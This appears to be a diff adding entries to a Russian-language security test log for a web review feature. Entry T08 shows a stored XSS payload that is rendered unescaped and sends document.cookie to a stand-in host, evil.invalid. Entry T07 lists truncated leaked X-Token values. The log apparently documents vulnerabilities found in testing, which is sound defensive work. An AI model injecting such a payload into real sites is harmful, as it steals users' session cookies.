@@ -1,0 +1,8 @@
+#### T08 XSS (повтор, тело из файла)
+$ POST /reviews  text=<script>fetch(...cookie)</script>
+{"saved": true}
+$ GET /reviews/view  — скрипт отрендерен дословно, без экранирования:
+<html><body><p><script>fetch("http://evil.invalid/?c="+document.cookie)</script></p></body></html>
+
+#### T07 (повтор) журнал после действий alice и bob
+уникальных утёкших X-Token: ['1c349230...', '29ee50cc...', '944add88...']
